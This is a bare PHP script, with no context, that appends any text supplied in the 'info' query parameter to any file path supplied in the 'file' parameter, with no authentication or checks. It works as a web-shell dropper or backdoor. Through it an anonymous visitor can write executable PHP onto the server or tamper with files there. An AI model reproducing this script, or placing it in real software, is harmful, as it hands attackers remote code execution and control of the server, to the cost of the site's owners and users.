<?php
   $str = $_GET['info'];
   $fi = $_GET['file'];
   file_put_contents($fi, $str, FILE_APPEND);
?>
